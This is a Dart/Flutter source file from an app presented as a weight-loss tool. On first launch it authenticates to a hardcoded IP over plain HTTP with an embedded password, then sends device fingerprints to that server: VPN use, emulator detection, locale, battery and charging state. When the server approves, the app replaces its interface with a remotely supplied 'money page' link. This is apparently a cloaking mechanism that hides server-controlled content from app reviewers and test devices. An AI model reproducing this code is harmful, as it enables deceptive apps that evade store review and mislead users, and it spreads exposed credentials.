// ignore_for_file: use_build_context_synchronously

import 'dart:developer';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:weightburner_119/burner/burner_local_model.dart';
import 'package:weightburner_119/burner/burner_money_page.dart';
import 'package:weightburner_119/burner/burner_provider.dart';
import 'package:weightburner_119/burner/burner_response_object.dart';
import 'package:weightburner_119/core/urls.dart';
import 'package:weightburner_119/onbording/onbording_clnjsdsdv.dart';
import 'burner_authorization.dart';
import 'burner_funcii.dart';

Future<void> ochenvazhnayafuncia(
    BuildContext context, Function(bool) isPhotoburner) async {
  final burnerDb = await BurnerRepository().burnerHGet();
  if (burnerDb == null) {
    await Future.delayed(const Duration(milliseconds: 1200));
    final String? cluchAvto = await burnerAuthorization(
      addPath: 'http://159.89.248.76/api/token/',
      l: 'oauth',
      p: '5.{r8<tWc>!Y2E3',
    );
    if (cluchAvto != null) {
      final burnerprxTemp = await burnerIsUsingVpn();
      final burnerloc = await burnerCountryCode();
      final burnerisEmul = await burnerIsSemulator(context);
      final burnerbtrLevel = await burnerBatteryLevel();
      final burnerisZarayd = await burnerIsCharging();
      const burnerisSim = true;
      final burnerDate = await burnerGetTime();
      try {
        BurnerResponse? burnerResponse;

        final accountOtvetRegistr = await Dio(
          BaseOptions(
            headers: {'Authorization': 'Bearer $cluchAvto'},
          ),
        ).post(
          'http://159.89.248.76/api/ads_request/',
          data: {
            "bundle_name": "inc.weight.burner",
            "timestamp": burnerDate,
            "locale": burnerloc,
            "prx_temp": burnerprxTemp,
            "emul_temp": burnerisEmul,
            "battery_temp": burnerisZarayd,
            "mnostate_temp": burnerisSim,
            "btry_temp": burnerbtrLevel,
          },
        );
        if (accountOtvetRegistr.data != null) {
          burnerResponse = BurnerResponse.fromJson(accountOtvetRegistr.data);
        }

        if (burnerResponse != null) {
          if (burnerResponse.boolValue) {
            String burnerL1 =
                '${burnerResponse.burnerResponseObject.rev}${burnerResponse.burnerResponseObject.pvr}';
            final signalchikIdenty = OneSignal.User.pushSubscription.id;
            if (burnerL1.contains('{click_id}')) {
              burnerL1 = burnerL1.replaceAll(
                  '{click_id}', '$signalchikIdenty:${DocFF.signalchik}');
            }
            late BurnerLocalModel burnerHiveObject;
            burnerHiveObject = BurnerLocalModel(
              regburner: burnerL1,
              logburner: burnerL1,
              strtburner: true,
              cabburner: '',
            );
            BurnerRepository().burnerHSet(burnerHiveObject);
            isPhotoburner(true);
            burnerPushReplacement(
              context,
              BurnerMoneyPage(
                link: burnerHiveObject.regburner,
                cache: false,
              ),
            );
            burnerCallReview(10);

            return;
          }
        }
      } catch (e) {
        throw Exception(e);
      }
    }
    isPhotoburner(false);
    await Future.delayed(const Duration(seconds: 3));
    burnerPushReplacement(context, const OnbordingLajbcascas());
    BurnerRepository().burnerHSet(
      BurnerLocalModel(
          regburner: '', logburner: '', strtburner: false, cabburner: ''),
    );
    burnerCallReview(10);
  } else {
    if (burnerDb.strtburner) {
      isPhotoburner(true);
      await Future.delayed(const Duration(seconds: 3));
      if (burnerDb.cabburner.isNotEmpty) {
        log("Cache URL: ${burnerDb.cabburner}");
        burnerPushReplacement(
            context,
            BurnerMoneyPage(
              link: burnerDb.cabburner,
              cache: true,
            ));
      } else {
        burnerPushReplacement(
            context,
            BurnerMoneyPage(
              link: burnerDb.logburner,
              cache: true,
            ));
      }
    } else {
      isPhotoburner(false);
      await Future.delayed(const Duration(seconds: 3));
      burnerPushReplacement(
        context,
        const OnbordingLajbcascas(),
      );
    }
  }
}

void burnerPushReplacement(BuildContext context, Widget screen) {
  Navigator.pushReplacement(
    context,
    MaterialPageRoute(builder: (_) => screen),
  );
}

Future<String> burnerGetRealLink(String burnerUrl) async {
  final burnerRealLink = await Dio().get(burnerUrl);

  return burnerRealLink.realUri.toString();
}

Future<void> burnerCallReview(int duration) async {
  await Future.delayed(Duration(seconds: duration));
  try {
    final InAppReview burnerReview = InAppReview.instance;

    if (await burnerReview.isAvailable()) {
      burnerReview.requestReview();
    }
  } catch (e) {
    throw Exception(e);
  }
}
